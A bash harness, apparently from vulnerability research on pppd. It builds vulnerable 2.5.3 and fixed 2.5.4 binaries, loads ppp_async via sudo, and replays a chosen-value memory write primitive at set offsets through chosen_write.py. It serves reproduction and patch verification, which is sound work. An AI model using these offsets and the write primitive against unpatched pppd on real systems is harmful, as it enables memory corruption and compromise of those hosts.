#!/usr/bin/env bash
# Local-only replay of the chosen-value write primitive on pinned pppd.
# Reuses run_matrix.sh builds where possible and adds a non-ASan plain build.
# Requires sudo -n and the ppp_async kernel line discipline.
set -euo pipefail
cd "$(dirname "$0")/.."
PINS=../pins
RAW=raw
mkdir -p "$RAW" chosen/evidence
sudo -n rm -f "$RAW"/w123-*-asan.*
sha256sum -c <<'EOF'
96f962b9f9411ee4a75da34e5b6177eaec4dce0527af009891210641e0b74edf  ../pins/ppp-2.5.3.tar.gz
379a630a40d858a1347f6592d671791dde12101697a743ef9900012f3765be31  ../pins/ppp-2.5.4.tar.gz
EOF

build_plain() {
    rm -rf "$RAW/build-vuln-plain"
    tar xzf "$PINS/ppp-2.5.3.tar.gz" -C "$RAW"
    mv "$RAW/ppp-project-ppp-0cfdb73" "$RAW/build-vuln-plain"
    (cd "$RAW/build-vuln-plain" && ./autogen.sh >/dev/null 2>&1 &&
     ./configure CC=gcc CFLAGS='-g -O0' >configure.log 2>&1 &&
     make -C pppd -j4 pppd >build.log 2>&1)
}

if [ ! -x "$RAW/build-vuln/pppd/pppd" ] || [ ! -x "$RAW/build-fixed/pppd/pppd" ]; then
    bash run_matrix.sh >/dev/null
fi
[ -x "$RAW/build-vuln-plain/pppd/pppd" ] || build_plain

V="$PWD/$RAW/build-vuln/pppd/pppd"
F="$PWD/$RAW/build-fixed/pppd/pppd"
P="$PWD/$RAW/build-vuln-plain/pppd/pppd"
sudo -n modprobe ppp_async

python3 chosen_write.py --binary "$P" --target 1500 --value 50574e33 --tag w123-plain-t1500
python3 chosen_write.py --binary "$P" --target 1504 --value 50574e33 --tag w123-plain-t1504
python3 chosen_write.py --binary "$P" --target 1528 --value 50574e33 --tag w123-plain-t1528
python3 chosen_write.py --binary "$V" --target 1500 --value 50574e33 --tag w123-asan-vuln-t1500
python3 chosen_write.py --binary "$F" --target 1500 --value 50574e33 --tag w123-asan-fixed-t1500

python3 chosen/normalize_chosen.py
